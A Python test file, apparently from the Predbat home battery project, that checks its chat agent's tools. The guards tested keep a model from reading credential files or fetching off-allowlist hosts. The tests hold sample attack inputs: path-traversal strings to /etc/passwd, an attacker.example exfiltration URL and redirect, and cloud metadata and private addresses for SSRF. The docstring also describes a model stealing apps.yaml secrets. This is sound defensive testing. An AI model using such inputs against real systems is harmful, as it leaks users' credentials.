# -----------------------------------------------------------------------------
# Predbat Home Battery System
# Copyright Trefor Southwell 2026 - All Rights Reserved
# This application maybe used for personal use only and not for commercial use
# -----------------------------------------------------------------------------
# fmt off
# pylint: disable=consider-using-f-string
# pylint: disable=line-too-long
# pylint: disable=attribute-defined-outside-init
#

"""Tests for the chat agent's own tools: documentation search, source access, URL fetch and the
apps.yaml write.

The source and fetch guards are the security surface of most of this feature - the source tools
are what stop a model reading apps.yaml off disk, and the fetch allowlist is what stops it posting
what it read to an address of its choosing. set_apps_config is the other side of that same
surface: it is the one tool here that is allowed to touch apps.yaml, so its tests are the ones that
prove it can only ever change a key that already exists, can never touch a credential, and leaves
comments and formatting alone - see
test_set_apps_config_success_preserves_formatting_backs_up_and_mirrors_args, which is the whole
reason this tool uses ruamel.yaml rather than a plain YAML dump.
"""

import asyncio
import os
import shutil
import tempfile

import chat_tools
from utils import mask_secret_args, parse_yaml_path
from chat_tools import CHAT_TOOL_DEFS, DOCS_READ_MAX_CHARS, read_docs, score_documents, search_docs, read_source, search_source, resolve_source_path, SourceAccessError, is_endpoint_key
from chat_tools import DEFAULT_FETCH_ALLOWLIST, FetchRefusedError, host_allowed, html_to_text, validate_fetch_target
from chat_tools import APPS_YAML_RESTART_WARNING, set_apps_config, validate_apps_schema_type
from agent_tools import openai_tool_list

SAMPLE_DOCS = [
    {"location": "customisation/", "title": "Customisation", "text": "The best_soc_keep setting reserves battery capacity for unexpected load. Raise it if you run out overnight."},
    {"location": "energy-rates/", "title": "Energy rates", "text": "Octopus Agile rates are fetched every thirty minutes and used to plan charging windows."},
    {"location": "faq/", "title": "FAQ", "text": "Why is my battery charging at 3am? Usually because the overnight rate is the cheapest in the plan."},
]


class FakeCachedStorage:
    """A storage stand-in whose fetch_cached calls the fetch function at most once."""

    def __init__(self, payload=None, fail=False):
        """Hold the payload fetch_cached should return, or arrange for a failure."""
        self.payload = payload
        self.fail = fail
        self.calls = 0

    async def fetch_cached(self, module, filename, fetch_fn, fresh_minutes=30, stale_minutes=35, format="yaml"):
        """Return the cached payload, counting how many times a real fetch would have happened."""
        self.calls += 1
        if self.fail:
            return None
        return self.payload


def test_chat_tool_defs_shape(my_predbat):
    """CHAT_TOOL_DEFS holds the six chat-only tools, only set_apps_config flagged as a write.

    set_apps_config is the one deliberate exception to "none of these are Predbat writes": it is
    the only tool in this module that changes apps.yaml, so it is the only one that must hit
    chat.py's confirmation gate (definition.get("writes") in _run_one_tool). Everything else here
    only reads the conversation, Predbat's documentation, its own source, or an allowlisted URL.
    """
    failed = False
    print("**** Testing CHAT_TOOL_DEFS shape ****")
    names = [entry["name"] for entry in CHAT_TOOL_DEFS]
    expected = ["set_chat_title", "search_docs", "read_docs", "search_source", "read_source", "fetch_url", "set_apps_config"]
    if names != expected:
        print("ERROR: CHAT_TOOL_DEFS names are {}, expected {}".format(names, expected))
        failed = True

    writers = {entry["name"] for entry in CHAT_TOOL_DEFS if entry.get("writes")}
    if writers != {"set_apps_config"}:
        print("ERROR: CHAT_TOOL_DEFS writes flags are {}, expected only set_apps_config".format(sorted(writers)))
        failed = True

    for entry in CHAT_TOOL_DEFS:
        for field in ("name", "description", "parameters"):
            if field not in entry:
                print("ERROR: {} is missing '{}'".format(entry.get("name"), field))
                failed = True

    projected = openai_tool_list(CHAT_TOOL_DEFS)
    if len(projected) != len(CHAT_TOOL_DEFS):
        print("ERROR: openai_tool_list(CHAT_TOOL_DEFS) returned {} entries".format(len(projected)))
        failed = True

    return failed


def test_score_documents(my_predbat):
    """Scoring ranks by term overlap, weights the title, and respects max_results."""
    failed = False
    print("**** Testing documentation scoring ****")

    results = score_documents(SAMPLE_DOCS, "why is my battery charging at 3am", max_results=2)
    if not results:
        print("ERROR: scoring returned nothing for an obvious query")
        failed = True
    elif results[0]["url"] != chat_tools.DOCS_SITE_ROOT + "faq/":
        print("ERROR: top hit was {}, expected the FAQ page".format(results[0]["url"]))
        failed = True
    if len(results) > 2:
        print("ERROR: max_results was ignored, got {} results".format(len(results)))
        failed = True

    titled = score_documents(SAMPLE_DOCS, "customisation", max_results=3)
    if not titled or titled[0]["title"] != "Customisation":
        print("ERROR: a title match did not rank first: {}".format(titled))
        failed = True

    for result in results:
        for field in ("title", "url", "excerpt"):
            if field not in result:
                print("ERROR: result is missing '{}': {}".format(field, result))
                failed = True
        if len(result.get("excerpt", "")) > 400:
            print("ERROR: excerpt is {} characters, longer than the cap".format(len(result["excerpt"])))
            failed = True

    if score_documents(SAMPLE_DOCS, "zz", max_results=3):
        print("ERROR: a query of only short terms should match nothing")
        failed = True

    return failed


def test_search_docs_uses_the_cache(my_predbat):
    """search_docs goes through fetch_cached and reports a clean error when the index is missing."""
    failed = False
    print("**** Testing search_docs caching and failure ****")

    storage = FakeCachedStorage(payload={"config": {}, "docs": SAMPLE_DOCS})
    first = asyncio.run(search_docs(storage, "best_soc_keep"))
    if not first.get("success") or not first.get("data"):
        print("ERROR: search_docs failed on a good index: {}".format(first))
        failed = True

    second = asyncio.run(search_docs(storage, "octopus agile"))
    if not second.get("success"):
        print("ERROR: second search_docs call failed: {}".format(second))
        failed = True

    missing = asyncio.run(search_docs(FakeCachedStorage(fail=True), "anything"))
    if missing.get("success") or "unavailable" not in str(missing.get("error", "")).lower():
        print("ERROR: an unfetchable index should return a clean error, got {}".format(missing))
        failed = True

    clamped = asyncio.run(search_docs(storage, "rates", max_results=999))
    if len(clamped.get("data") or []) > 10:
        print("ERROR: max_results was not clamped to 10")
        failed = True

    return failed


def _make_source_tree():
    """Build a throwaway source tree with the decoy files a real install can contain.

    plan.py is deliberately oversized: enough filler lines to exceed SOURCE_MAX_LINES, plus one
    line long enough to exceed SOURCE_MATCH_LINE_MAX, so the tests that assert those caps
    actually exercise them rather than passing because the fixture never came close. wide.py
    exists purely to exceed SOURCE_MAX_BYTES within its first SOURCE_MAX_LINES lines.
    """
    root = tempfile.mkdtemp(prefix="predbat_src_")
    with open(os.path.join(root, "plan.py"), "w", encoding="utf-8") as handle:
        handle.write("def calculate_plan(self):\n    # marker_symbol lives here\n    return True\n" + "# filler\n" * 450 + "# marker_symbol " + ("y" * 320) + "\n")
    with open(os.path.join(root, "prediction_kernel.cpp"), "w", encoding="utf-8") as handle:
        handle.write("// marker_symbol in C++\nint main() { return 0; }\n")
    with open(os.path.join(root, "wide.py"), "w", encoding="utf-8") as handle:
        handle.write(("# " + ("w" * 200) + "\n") * 500)
    with open(os.path.join(root, "predbat.log"), "w", encoding="utf-8") as handle:
        handle.write("2026-08-27: marker_symbol should never be reachable\n")
    with open(os.path.join(root, "apps.yaml"), "w", encoding="utf-8") as handle:
        handle.write("octopus_api_key: sk-marker_symbol-secret\n")
    with open(os.path.join(root, "secrets.yaml"), "w", encoding="utf-8") as handle:
        handle.write("ha_key: marker_symbol\n")
    with open(os.path.join(root, "old_plan.py.bak"), "w", encoding="utf-8") as handle:
        handle.write("marker_symbol in a backup\n")
    with open(os.path.join(root, "kernel.so"), "wb") as handle:
        handle.write(b"\x7fELF marker_symbol")
    os.makedirs(os.path.join(root, "cache"), exist_ok=True)
    with open(os.path.join(root, "cache", "chat_token.json"), "w", encoding="utf-8") as handle:
        handle.write('{"access_token": "marker_symbol"}')
    os.makedirs(os.path.join(root, "venv", "lib"), exist_ok=True)
    with open(os.path.join(root, "venv", "lib", "dependency.py"), "w", encoding="utf-8") as handle:
        handle.write("marker_symbol from a dependency\n")
    os.makedirs(os.path.join(root, "__pycache__"), exist_ok=True)
    with open(os.path.join(root, "__pycache__", "cached.py"), "w", encoding="utf-8") as handle:
        handle.write("marker_symbol from a cache\n")
    return root


def test_search_source(my_predbat):
    """search_source finds real source, skips dependencies and caches, and reports truncation."""
    failed = False
    print("**** Testing search_source ****")
    root = _make_source_tree()
    try:
        result = search_source("marker_symbol", root=root)
        if not result.get("success"):
            print("ERROR: search_source failed: {}".format(result.get("error")))
            failed = True
        files = {hit["file"] for hit in result.get("data") or []}
        if "plan.py" not in files:
            print("ERROR: search_source missed plan.py, found {}".format(files))
            failed = True
        if "prediction_kernel.cpp" not in files:
            print("ERROR: search_source missed the C++ file, found {}".format(files))
            failed = True

        forbidden = {"predbat.log", "apps.yaml", "secrets.yaml", "old_plan.py.bak", "kernel.so", os.path.join("cache", "chat_token.json"), os.path.join("venv", "lib", "dependency.py"), os.path.join("__pycache__", "cached.py")}
        leaked = files & forbidden
        if leaked:
            print("ERROR: search_source reached files it must never read: {}".format(leaked))
            failed = True

        truncated_hit = False
        for hit in result.get("data") or []:
            if len(hit.get("text", "")) > chat_tools.SOURCE_MATCH_LINE_MAX:
                print("ERROR: a match line was not truncated: {} chars".format(len(hit["text"])))
                failed = True
            if len(hit.get("text", "")) == chat_tools.SOURCE_MATCH_LINE_MAX:
                truncated_hit = True
            if "line" not in hit:
                print("ERROR: a match is missing its line number: {}".format(hit))
                failed = True
        if not truncated_hit:
            print("ERROR: no match line was long enough to exercise the {}-character truncation".format(chat_tools.SOURCE_MATCH_LINE_MAX))
            failed = True

        capped = search_source("filler", max_results=2, root=root)
        if len(capped.get("data") or []) > 2:
            print("ERROR: max_results was ignored")
            failed = True
        if not capped.get("total_matches") or capped["total_matches"] <= 2:
            print("ERROR: total_matches did not report the truncation: {}".format(capped.get("total_matches")))
            failed = True

        scoped = search_source("marker_symbol", file="plan.py", root=root)
        if {hit["file"] for hit in scoped.get("data") or []} != {"plan.py"}:
            print("ERROR: the file argument did not scope the search: {}".format(scoped.get("data")))
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


def test_search_source_rejects_bad_patterns(my_predbat):
    """An over-long or uncompilable pattern is a clean error, never an exception."""
    failed = False
    print("**** Testing search_source pattern validation ****")
    root = _make_source_tree()
    try:
        long_pattern = search_source("x" * 500, root=root)
        if long_pattern.get("success"):
            print("ERROR: an over-long pattern was accepted")
            failed = True

        broken = search_source("marker_symbol[", root=root)
        if broken.get("success") or "regular expression" not in str(broken.get("error", "")).lower():
            print("ERROR: an uncompilable pattern did not report cleanly: {}".format(broken))
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


def test_read_source(my_predbat):
    """read_source returns a numbered slice, clamps its size, and reports the file length."""
    failed = False
    print("**** Testing read_source ****")
    root = _make_source_tree()
    try:
        result = read_source("plan.py", root=root)
        if not result.get("success"):
            print("ERROR: read_source failed on a real source file: {}".format(result.get("error")))
            failed = True
        if "calculate_plan" not in str(result.get("data", {}).get("lines", "")):
            print("ERROR: read_source did not return the file contents")
            failed = True
        if not result.get("data", {}).get("total_lines"):
            print("ERROR: read_source did not report total_lines, so the model cannot page")
            failed = True

        paged = read_source("plan.py", start_line=3, max_lines=2, root=root)
        lines = str(paged.get("data", {}).get("lines", "")).strip().splitlines()
        if len(lines) != 2:
            print("ERROR: paging returned {} lines, expected 2".format(len(lines)))
            failed = True
        elif not lines[0].strip().startswith("3"):
            print("ERROR: paging did not start at line 3: {!r}".format(lines[0]))
            failed = True

        clamped = read_source("plan.py", max_lines=99999, root=root)
        clamped_data = clamped.get("data", {})
        clamped_lines = str(clamped_data.get("lines", "")).strip().splitlines()
        if clamped_data.get("total_lines", 0) <= chat_tools.SOURCE_MAX_LINES:
            print("ERROR: plan.py is not long enough to exercise the {}-line cap, has {} lines".format(chat_tools.SOURCE_MAX_LINES, clamped_data.get("total_lines")))
            failed = True
        if len(clamped_lines) != chat_tools.SOURCE_MAX_LINES:
            print("ERROR: max_lines was not clamped to exactly {}, got {} lines".format(chat_tools.SOURCE_MAX_LINES, len(clamped_lines)))
            failed = True

        byte_capped = read_source("wide.py", max_lines=99999, root=root)
        byte_capped_text = str(byte_capped.get("data", {}).get("lines", ""))
        if "truncated at" not in byte_capped_text or "bytes" not in byte_capped_text:
            print("ERROR: the byte cap did not fire on an oversized file, or its marker is missing: {!r}".format(byte_capped_text[-160:]))
            failed = True

        if read_source("prediction_kernel.cpp", root=root).get("success") is not True:
            print("ERROR: read_source refused a C++ source file")
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


def test_read_source_refuses_everything_it_should(my_predbat):
    """The extension allowlist and path containment keep config, logs and the token cache out."""
    failed = False
    print("**** Testing read_source access guards ****")
    root = _make_source_tree()
    try:
        forbidden = ["apps.yaml", "secrets.yaml", "predbat.log", "old_plan.py.bak", "kernel.so", "cache/chat_token.json", "../../../etc/passwd", "/etc/passwd", "venv/lib/dependency.py", "__pycache__/cached.py"]
        for target in forbidden:
            result = read_source(target, root=root)
            if result.get("success"):
                print("ERROR: read_source returned contents for {} - this is a credential leak path".format(target))
                failed = True
            elif not result.get("error"):
                print("ERROR: read_source refused {} without saying why".format(target))
                failed = True

        outside = os.path.join(tempfile.mkdtemp(prefix="predbat_out_"), "escaped.py")
        with open(outside, "w", encoding="utf-8") as handle:
            handle.write("secret = 'outside the source root'\n")
        link = os.path.join(root, "escaped.py")
        try:
            os.symlink(outside, link)
        except (OSError, NotImplementedError):
            print("Info: symlinks unavailable on this platform, skipping the symlink case")
        else:
            if read_source("escaped.py", root=root).get("success"):
                print("ERROR: a symlink pointing outside the source root was followed")
                failed = True
            scanned = search_source("outside the source root", root=root)
            if scanned.get("data"):
                print("ERROR: search_source's full-tree walk followed a symlink out of the source root: {}".format(scanned.get("data")))
                failed = True

        try:
            resolve_source_path("apps.yaml", root=root)
            print("ERROR: resolve_source_path accepted a .yaml path")
            failed = True
        except SourceAccessError:
            pass
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


class _FakeClock:
    """A scripted monotonic clock: returns each value from a list in order, then holds the last one."""

    def __init__(self, values):
        """Store the sequence of timestamps this fake clock will return, in order."""
        self._values = list(values)

    def monotonic(self):
        """Return the next scripted timestamp, holding at the last one once the list is exhausted."""
        if len(self._values) > 1:
            return self._values.pop(0)
        return self._values[0]


def test_search_source_bounds_a_single_large_file(my_predbat):
    """The scan budget is re-checked inside the per-line loop, not just between files.

    A single large file must not be able to stall the scan past SOURCE_SCAN_SECONDS on its own.
    The clock is scripted rather than real time, so this fires deterministically instead of
    needing an actual multi-second sleep: `started` and the top-of-file check both land inside
    the budget, so only the per-line check (fired every SOURCE_SCAN_CHECK_LINES lines) can be the
    one that trips it here.
    """
    failed = False
    print("**** Testing search_source per-line scan budget ****")
    root = _make_source_tree()
    try:
        huge_name = "huge_scan_budget.py"
        with open(os.path.join(root, huge_name), "w", encoding="utf-8") as handle:
            for number in range(2000):
                handle.write("# marker_symbol filler line {}\n".format(number))

        original_clock = chat_tools.time
        chat_tools.time = _FakeClock([0.0, 0.0, chat_tools.SOURCE_SCAN_SECONDS + 1.0])
        try:
            result = search_source("marker_symbol", file=huge_name, root=root)
        finally:
            chat_tools.time = original_clock

        if not result.get("success"):
            print("ERROR: search_source failed: {}".format(result.get("error")))
            failed = True
        if result.get("total_matches", 0) >= 2000:
            print("ERROR: the per-line scan budget did not stop a single large file, saw {} matches".format(result.get("total_matches")))
            failed = True
        if "partial" not in str(result.get("description", "")):
            print("ERROR: a scan stopped mid-file did not report itself as partial: {}".format(result.get("description")))
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


def test_source_extension_matching_edge_cases(my_predbat):
    """Extension matching is case-insensitive and judges a double extension by its final suffix."""
    failed = False
    print("**** Testing source extension matching edge cases ****")
    root = _make_source_tree()
    try:
        with open(os.path.join(root, "SHOUTY.PY"), "w", encoding="utf-8") as handle:
            handle.write("marker_symbol = 'uppercase extension'\n")
        with open(os.path.join(root, "foo.py.yaml"), "w", encoding="utf-8") as handle:
            handle.write("marker_symbol: not source\n")

        uppercase = read_source("SHOUTY.PY", root=root)
        if not uppercase.get("success"):
            print("ERROR: an uppercase .PY extension was refused: {}".format(uppercase.get("error")))
            failed = True

        double_extension = read_source("foo.py.yaml", root=root)
        if double_extension.get("success"):
            print("ERROR: foo.py.yaml was accepted - its final extension is .yaml, not .py")
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


def _resolver(address):
    """Return a fake DNS resolver that maps every hostname to one address."""

    def resolve(host):
        """Pretend every hostname resolves to the configured address."""
        return [address]

    return resolve


def test_host_allowlist(my_predbat):
    """Exact hosts and their subdomains pass; lookalike hosts must not."""
    failed = False
    print("**** Testing fetch host allowlist ****")
    allowed = ["springfall2008.github.io", "github.com"]
    for host in ["springfall2008.github.io", "github.com", "docs.github.com"]:
        if not host_allowed(host, allowed):
            print("ERROR: {} should be allowed".format(host))
            failed = True
    for host in ["evilspringfall2008.github.io", "github.com.attacker.example", "notgithub.com", "attacker.example", ""]:
        if host_allowed(host, allowed):
            print("ERROR: {} was allowed - substring matching would be an exfiltration hole".format(host))
            failed = True
    return failed


def test_validate_fetch_target(my_predbat):
    """Scheme, allowlist and resolved-address rules all refuse before any request is made."""
    failed = False
    print("**** Testing fetch target validation ****")
    allowlist = list(DEFAULT_FETCH_ALLOWLIST)
    public = _resolver("140.82.121.4")

    try:
        validate_fetch_target("https://github.com/springfall2008/batpred", allowlist, resolver=public)
    except FetchRefusedError as error:
        print("ERROR: a legitimate GitHub URL was refused: {}".format(error))
        failed = True

    refusals = [
        ("http://github.com/x", "plain http"),
        ("ftp://github.com/x", "a non-http scheme"),
        ("https://attacker.example/x", "an off-allowlist host"),
        ("not a url", "a malformed url"),
    ]
    for url, why in refusals:
        try:
            validate_fetch_target(url, allowlist, resolver=public)
            print("ERROR: {} was accepted ({})".format(url, why))
            failed = True
        except FetchRefusedError:
            pass

    for address, why in [("127.0.0.1", "loopback"), ("192.168.1.10", "private"), ("169.254.169.254", "link-local metadata"), ("0.0.0.0", "unspecified"), ("::1", "IPv6 loopback")]:
        try:
            validate_fetch_target("https://github.com/x", allowlist, resolver=_resolver(address))
            print("ERROR: an allowlisted host resolving to {} ({}) was accepted".format(address, why))
            failed = True
        except FetchRefusedError:
            pass

    return failed


def test_html_to_text(my_predbat):
    """Script and style bodies are dropped, tags stripped, entities decoded."""
    failed = False
    print("**** Testing html_to_text ****")
    text = html_to_text("<html><head><style>p{color:red}</style><script>var secret=1;</script></head><body><h1>Title</h1><p>Hello &amp; welcome</p></body></html>")
    for banned in ["var secret", "color:red", "<p>", "<script"]:
        if banned in text:
            print("ERROR: html_to_text leaked {!r}: {!r}".format(banned, text))
            failed = True
    if "Title" not in text or "Hello & welcome" not in text:
        print("ERROR: html_to_text lost the readable content: {!r}".format(text))
        failed = True
    return failed


def test_fetch_url_refusals_are_results(my_predbat):
    """A refused fetch comes back as a tool result naming the rule, never as an exception."""
    failed = False
    print("**** Testing fetch_url refusal reporting ****")
    result = asyncio.run(chat_tools.fetch_url("https://attacker.example/steal?d=secret", resolver=_resolver("93.184.216.34")))
    if result.get("success"):
        print("ERROR: fetch_url fetched an off-allowlist host")
        failed = True
    if not result.get("error"):
        print("ERROR: fetch_url refused without naming a reason: {}".format(result))
        failed = True

    result = asyncio.run(chat_tools.fetch_url("https://github.com/x", allowlist=["github.com"], resolver=_resolver("10.0.0.5")))
    if result.get("success"):
        print("ERROR: fetch_url reached a private address through an allowlisted host")
        failed = True

    return failed


def test_validate_fetch_target_checks_every_resolved_address(my_predbat):
    """A future 'optimisation' to check only the first resolved address must not go unnoticed.

    validate_fetch_target must refuse a host that resolves to a private address anywhere in its
    address list, not just when DNS happens to return it first - and must accept a host that
    resolves only to public addresses. This is hermetic: no HTTP request is involved, only the
    resolver seam.
    """
    failed = False
    print("**** Testing that every resolved address is checked, not just the first ****")
    allowlist = ["github.com"]

    def public_then_private(host):
        """Resolve to a public address followed by a private one."""
        return ["93.184.216.34", "10.0.0.5"]

    def two_public(host):
        """Resolve to two distinct public addresses."""
        return ["93.184.216.34", "140.82.121.4"]

    try:
        validate_fetch_target("https://github.com/x", allowlist, resolver=public_then_private)
        print("ERROR: a host resolving to a private address after a public one was accepted")
        failed = True
    except FetchRefusedError:
        pass

    try:
        validate_fetch_target("https://github.com/x", allowlist, resolver=two_public)
    except FetchRefusedError as error:
        print("ERROR: a host resolving to two public addresses was refused: {}".format(error))
        failed = True

    return failed


class _FakeFetchResponse:
    """An async context manager standing in for one aiohttp response in fetch_url redirect tests."""

    def __init__(self, status, headers=None, body=b""):
        """Store the scripted status, headers and body this fake response returns."""
        self.status = status
        self.headers = headers or {}
        self.content = self
        self._body = body

    async def read(self, n):
        """Return the scripted body, ignoring the requested byte limit for this simple fake."""
        return self._body

    async def __aenter__(self):
        """Enter the async context manager, returning this fake response."""
        return self

    async def __aexit__(self, *exc):
        """Exit the async context manager without suppressing any exception."""
        return False


class _FakeFetchSession:
    """A fake aiohttp.ClientSession: scripts one response per URL and records every request made.

    fetch_url creates its own aiohttp.ClientSession, so the seam for testing its redirect
    behaviour is chat_tools.aiohttp.ClientSession itself - the tests that use this class replace
    it for their duration and restore it in a finally block.
    """

    def __init__(self, responses):
        """Store the URL-to-response mapping to serve and start an empty request log."""
        self.responses = responses
        self.requested = []

    async def __aenter__(self):
        """Enter the async context manager, returning this fake session."""
        return self

    async def __aexit__(self, *exc):
        """Exit the async context manager without suppressing any exception."""
        return False

    def get(self, url, allow_redirects=False):
        """Record the requested URL and return the scripted fake response for it."""
        self.requested.append(url)
        return self.responses[url]


def test_fetch_url_revalidates_every_redirect_hop(my_predbat):
    """Each redirect hop is re-validated before it is requested, and endless chains are bounded.

    The return value alone cannot prove a hop was re-validated: a guard that ran too late, or not
    at all, could still end up reporting failure after the off-allowlist host had already been
    asked for data. What matters is whether the fake session was ever asked to fetch it - that
    request going out is the leak, regardless of what the final result says.
    """
    failed = False
    print("**** Testing fetch_url re-validates every redirect hop ****")
    public = _resolver("140.82.121.4")
    original_session_class = chat_tools.aiohttp.ClientSession

    # A scripted 200 for the attacker URL too: if the guard is removed, the fake must be able to
    # actually serve it, so the assertion below is what catches the regression - not a KeyError
    # from the fake's dict lookup, which would fail the test for the wrong reason.
    off_allowlist_session = _FakeFetchSession(
        {
            "https://github.com/x": _FakeFetchResponse(302, headers={"Location": "https://attacker.example/steal"}),
            "https://attacker.example/steal": _FakeFetchResponse(200, headers={"Content-Type": "text/plain"}, body=b"stolen"),
        }
    )
    chat_tools.aiohttp.ClientSession = lambda timeout=None: off_allowlist_session
    try:
        result = asyncio.run(chat_tools.fetch_url("https://github.com/x", resolver=public))
    finally:
        chat_tools.aiohttp.ClientSession = original_session_class

    if result.get("success"):
        print("ERROR: fetch_url followed a redirect off the allowlist and reported success")
        failed = True
    if not result.get("error"):
        print("ERROR: fetch_url refused the redirect without naming a reason: {}".format(result))
        failed = True
    if any("attacker.example" in url for url in off_allowlist_session.requested):
        print("ERROR: fetch_url actually requested the off-allowlist redirect target - the leak already happened: {}".format(off_allowlist_session.requested))
        failed = True

    chain_responses = {}
    for hop in range(chat_tools.FETCH_MAX_REDIRECTS + 2):
        chain_responses["https://github.com/hop{}".format(hop)] = _FakeFetchResponse(302, headers={"Location": "https://github.com/hop{}".format(hop + 1)})
    chain_session = _FakeFetchSession(chain_responses)
    chat_tools.aiohttp.ClientSession = lambda timeout=None: chain_session
    try:
        chain_result = asyncio.run(chat_tools.fetch_url("https://github.com/hop0", resolver=public))
    finally:
        chat_tools.aiohttp.ClientSession = original_session_class

    if chain_result.get("success"):
        print("ERROR: an endless allowlisted redirect chain was followed to success")
        failed = True
    if "too many redirects" not in str(chain_result.get("error", "")).lower():
        print("ERROR: an over-long redirect chain did not report the too-many-redirects reason: {}".format(chain_result))
        failed = True

    return failed


def test_fetch_url_malformed_inputs_return_results(my_predbat):
    """A malformed URL or an unencodable hostname is a clean failure result, never an exception.

    urlparse() itself accepts syntax such as an unterminated IPv6 bracket or a bracketed non-IPv6
    literal - it is the .hostname property access that raises a bare ValueError for those, and
    FetchRefusedError subclassing ValueError does not catch it (Python matches on the actual
    instance type, not a shared base class). A hostname label over 63 characters fails IDNA
    encoding inside socket.getaddrinfo with UnicodeEncodeError, which is not an OSError subclass
    either. Both used to escape fetch_url as a live exception instead of a tool result.

    No resolver override is passed: the third case only exercises the fix if the real
    _default_resolver path runs, since a fake resolver would bypass socket.getaddrinfo entirely.
    That is still hermetic - the IDNA encoding failure happens locally before any DNS query or
    socket call, so nothing here touches the network. Letting an escaping exception propagate out
    of asyncio.run() here fails this test with an uncaught exception, which is itself evidence of
    a regression.
    """
    failed = False
    print("**** Testing fetch_url on malformed inputs that must not raise ****")
    malformed = ["https://[::1", "https://[gh]/x", "https://" + "a" * 64 + ".github.com/x"]
    for url in malformed:
        result = asyncio.run(chat_tools.fetch_url(url))
        if result.get("success"):
            print("ERROR: a malformed URL was treated as fetchable: {!r}".format(url))
            failed = True
        if not result.get("error"):
            print("ERROR: a malformed URL was refused without naming a reason: {!r} -> {}".format(url, result))
            failed = True
    return failed


# The fixture apps.yaml used by every set_apps_config test below. Deliberately carries a header
# comment block, a blank line, an inline comment directly above a value, and a quoted string - the
# things a plain yaml.safe_dump would silently destroy on a round trip, which is exactly what
# test_set_apps_config_success_preserves_formatting_backs_up_and_mirrors_args checks line-by-line.
FIXTURE_APPS_YAML = """##########################################
# Predbat test fixture apps.yaml
##########################################
pred_bat:
  # A comment above a boolean
  carbon_automatic: false

  # num_inverters comment
  num_inverters: 1
  ha_key: "should-never-change"
  my_custom_note: "leave me alone"
"""


def _apps_yaml_fixture(root):
    """Write FIXTURE_APPS_YAML into a temporary directory and return its path."""
    path = os.path.join(root, "apps.yaml")
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(FIXTURE_APPS_YAML)
    return path


def test_set_apps_config_requires_a_key(my_predbat):
    """A missing or non-string key is refused before apps.yaml is ever opened.

    Points both paths at a directory with no apps.yaml at all - if the key check were skipped and
    the file open attempted anyway, this would fail with a file-not-found error instead of the
    expected key-validation error, so this test also proves the check runs first.
    """
    failed = False
    print("**** Testing set_apps_config requires a key ****")
    for bad_key in (None, "", 42):
        result = set_apps_config(my_predbat, bad_key, "value", apps_yaml_path="/nonexistent/apps.yaml", backup_path="/nonexistent/apps.yaml.backup")
        if result.get("success"):
            print("ERROR: {!r} was accepted as a key".format(bad_key))
            failed = True
        if "key" not in str(result.get("error", "")).lower():
            print("ERROR: bad key {!r} was not refused with a message naming 'key': {}".format(bad_key, result))
            failed = True
    return failed


def test_set_apps_config_refuses_credential_key(my_predbat):
    """A key matching the secret heuristic is refused outright, and the file is never touched.

    Mutation check: commenting out the is_secret_key() guard in set_apps_config() (chat_tools.py)
    makes this test fail on both assertions - the call succeeds, and ha_key's line in apps.yaml
    changes - confirmed by hand while writing this test, then restored.
    """
    failed = False
    print("**** Testing set_apps_config refuses a credential key ****")
    root = tempfile.mkdtemp(prefix="predbat_apps_")
    try:
        apps_path = _apps_yaml_fixture(root)
        backup_path = apps_path + ".backup"
        original = open(apps_path, "r", encoding="utf-8").read()

        result = set_apps_config(my_predbat, "ha_key", "sk-new-secret", apps_yaml_path=apps_path, backup_path=backup_path)

        if result.get("success"):
            print("ERROR: a credential key was accepted: {}".format(result))
            failed = True
        if "credential" not in str(result.get("error", "")).lower():
            print("ERROR: the refusal did not explain why: {}".format(result))
            failed = True
        if open(apps_path, "r", encoding="utf-8").read() != original:
            print("ERROR: apps.yaml was modified despite the credential refusal")
            failed = True
        if os.path.exists(backup_path):
            print("ERROR: a backup was created for a refused credential write")
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


def test_set_apps_config_refuses_unknown_key(my_predbat):
    """A key not already present in apps.yaml is refused, and the file is never touched.

    This is not a tool for inventing configuration - it can only change a key that is already
    there, exactly like the web UI's own apps.yaml batch editor (WebInterface.html_apps_post).
    """
    failed = False
    print("**** Testing set_apps_config refuses an unknown key ****")
    root = tempfile.mkdtemp(prefix="predbat_apps_")
    try:
        apps_path = _apps_yaml_fixture(root)
        backup_path = apps_path + ".backup"
        original = open(apps_path, "r", encoding="utf-8").read()

        result = set_apps_config(my_predbat, "not_a_real_apps_yaml_config_item", "value", apps_yaml_path=apps_path, backup_path=backup_path)

        if result.get("success"):
            print("ERROR: an unknown key was accepted: {}".format(result))
            failed = True
        if "not found" not in str(result.get("error", "")).lower():
            print("ERROR: the refusal did not explain why: {}".format(result))
            failed = True
        if open(apps_path, "r", encoding="utf-8").read() != original:
            print("ERROR: apps.yaml was modified despite the unknown-key refusal")
            failed = True
        if os.path.exists(backup_path):
            print("ERROR: a backup was created for a refused unknown-key write")
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


def test_set_apps_config_refuses_a_schema_type_mismatch(my_predbat):
    """A value whose shape does not match the key's APPS_SCHEMA type is refused before writing."""
    failed = False
    print("**** Testing set_apps_config refuses a schema type mismatch ****")
    root = tempfile.mkdtemp(prefix="predbat_apps_")
    try:
        apps_path = _apps_yaml_fixture(root)
        backup_path = apps_path + ".backup"
        original = open(apps_path, "r", encoding="utf-8").read()

        # num_inverters is APPS_SCHEMA {"type": "integer", ...} - a string is the wrong shape.
        result = set_apps_config(my_predbat, "num_inverters", "two", apps_yaml_path=apps_path, backup_path=backup_path)

        if result.get("success"):
            print("ERROR: a type-mismatched value was accepted: {}".format(result))
            failed = True
        if "type" not in str(result.get("error", "")).lower():
            print("ERROR: the refusal did not explain why: {}".format(result))
            failed = True
        if open(apps_path, "r", encoding="utf-8").read() != original:
            print("ERROR: apps.yaml was modified despite the type-mismatch refusal")
            failed = True
        if os.path.exists(backup_path):
            print("ERROR: a backup was created for a refused type mismatch")
            failed = True
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return failed


def test_set_apps_config_success_preserves_formatting_backs_up_and_mirrors_args(my_predbat):
    """A valid change to an existing, non-secret key writes the file, keeping every other line
    byte-identical, takes a backup of the original first, mirrors the change into base.args, and
    repeats the restart warning in its own success result.

    The line-by-line comparison against the original is the entire reason set_apps_config uses
